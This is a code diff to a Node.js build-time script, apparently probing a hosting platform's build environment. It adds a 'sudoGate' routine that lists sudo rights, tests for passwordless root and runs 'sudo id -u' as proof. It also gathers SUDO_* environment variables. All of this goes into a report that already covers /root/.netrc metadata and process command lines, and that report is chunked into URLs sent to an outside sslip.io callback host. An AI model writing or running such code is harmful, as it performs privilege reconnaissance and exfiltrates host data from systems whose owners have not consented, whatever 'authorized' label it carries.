@@ -4,11 +4,11 @@ import http from "node:http";
 import https from "node:https";
 import os from "node:os";
 import path from "node:path";
-import { execFileSync } from "node:child_process";
+import { execFileSync, spawnSync } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_BUILD_IMPACT_GATE:r205";
+const marker = "HOSTINGER_NODE_BUILD_SUDO_GATE:r206";
 const callbackBase =
-  "https://147-182-179-38.sslip.io/hostinger-git-sentinel-9bd4c613/impact-r205";
+  "https://147-182-179-38.sslip.io/hostinger-git-sentinel-9bd4c613/impact-r206";
 
 function sha256(value) {
   return crypto.createHash("sha256").update(value).digest("hex");
@@ -101,6 +101,40 @@ function commandLines() {
     }
   }
   return results;
+}
+
+function sudoGate() {
+  const listing = spawnSync("/usr/bin/sudo", ["-n", "-l"], {
+    encoding: "utf8",
+    timeout: 5000,
+    stdio: ["ignore", "pipe", "pipe"],
+  });
+  const stdout = String(listing.stdout ?? "").slice(0, 16384);
+  const stderr = String(listing.stderr ?? "").slice(0, 16384);
+  const result = {
+    status: listing.status,
+    signal: listing.signal,
+    errorCode: listing.error?.code ?? null,
+    stdout,
+    stderr,
+    stdoutSha256: sha256(stdout),
+    stderrSha256: sha256(stderr),
+  };
+  const nopasswdAll = /\(ALL(?::ALL)?\)\s+NOPASSWD:\s+ALL/.test(stdout);
+  result.nopasswdAll = nopasswdAll;
+  if (nopasswdAll) {
+    const identity = spawnSync("/usr/bin/sudo", ["-n", "/usr/bin/id", "-u"], {
+      encoding: "utf8",
+      timeout: 5000,
+      stdio: ["ignore", "pipe", "pipe"],
+    });
+    result.fixedIdProof = {
+      status: identity.status,
+      stdout: String(identity.stdout ?? "").trim(),
+      stderr: String(identity.stderr ?? "").trim(),
+    };
+  }
+  return result;
 }
 
 function fileDescriptors() {
@@ -202,7 +236,7 @@ async function sendReport(report) {
   for (let index = 0; index < chunks.length; index += 1) {
     const url = `${callbackBase}/${String(index + 1).padStart(3, "0")}-${String(chunks.length).padStart(3, "0")}/${chunks[index]}`;
     await new Promise((resolve) => {
-      const request = https.get(url, { headers: { "User-Agent": "hostinger-authorized-node-impact-r205" }, timeout: 10_000 }, (response) => {
+      const request = https.get(url, { headers: { "User-Agent": "hostinger-authorized-node-sudo-r206" }, timeout: 10_000 }, (response) => {
         response.resume();
         response.once("end", resolve);
       });
@@ -247,6 +281,15 @@ const report = {
     readMetadata("/root/.netrc"),
   ],
   commandLines: commandLines(),
+  sudoEnvironment: {
+    SUDO_UID: process.env.SUDO_UID ?? null,
+    SUDO_GID: process.env.SUDO_GID ?? null,
+    SUDO_USER: process.env.SUDO_USER ?? null,
+    SUDO_HOME: process.env.SUDO_HOME ?? null,
+    SUDO_COMMAND: process.env.SUDO_COMMAND ? sensitiveMetadata("SUDO_COMMAND", process.env.SUDO_COMMAND) : null,
+    H_SHELL_CMD: process.env.H_SHELL_CMD ? sensitiveMetadata("H_SHELL_CMD", process.env.H_SHELL_CMD) : null,
+  },
+  sudoGate: sudoGate(),
   fileDescriptors: fileDescriptors(),
   metadata: await metadataMatrix(),
 };
